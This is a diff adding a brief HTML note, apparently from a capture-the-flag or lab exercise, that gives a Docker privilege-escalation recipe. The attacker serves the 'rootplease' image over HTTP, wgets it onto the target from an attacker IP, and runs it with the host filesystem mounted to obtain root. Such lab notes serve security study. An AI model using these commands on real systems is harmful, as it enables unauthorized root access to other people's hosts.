@@ -1,0 +1,30 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Docker PrivEsc</title>
+</head><body><div style="text-align: left"><span style="font-size: 21pt"><span style="font-size: 13pt"><span style="font-family: charter"><span style="font-family: Helvetica Neue">Docker exploit, in which you can pull off the privesc in one command:<br/>
+<span style="font-size: 16pt"><span style="font-family: Menlo">[local] &gt;&gt; sudo service docker start<br/>
+[local] &gt;&gt; sudo docker pull chrisfosterelli/rootplease<br/>
+[local] &gt;&gt; sudo docker save -o rootplease.tar chrisfosterelli/rootplease<br/>
+[local] &gt;&gt; python -m SimpleHTTPServer 5555<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</span></span></span></span></span></span></div><br/>
+<br/>
+<span style="font-family: charter"><span style="font-size: 21pt"><span style="font-family: Menlo"><span style="font-size: 16pt"><span style="font-family: Helvetica Neue"><span style="font-size: 13pt"><div style="text-align: left">[olympus] &gt;&gt; wget <a href="http://10.10.15.243:5555/rootplease.tar">http://10.10.15.243:5555/rootplease.tar</a>(This may take some time.)<br/>
+<br/>
+</div></span></span></span></span></span></span><span style="font-family: Helvetica Neue"><span style="font-size: 13pt"><div style="text-align: left"><span style="font-family: charter"><span style="font-size: 21pt"><span style="font-family: Menlo"><span style="font-size: 16pt">[olypmus] &gt;&gt; docker load -i rootplease.tar</span></span></span></span><span style="font-family: Menlo"><span style="font-size: 16pt">&gt; docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span></span><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</div></span></span><br/>
+<br/>
+<br/>
+<div style="text-align: left"><span style="font-family: Helvetica Neue"><span style="font-size: 11pt">Install docker<br/>
+</span></span></div><span style="font-size: 11pt"><a href="https://www.ptrace-security.com/blog/how-to-install-docker-on-kali-linux-2017-1/">https://www.ptrace-security.com/blog/how-to-install-docker-on-kali-linux-2017-1/</a> </span></body></html>
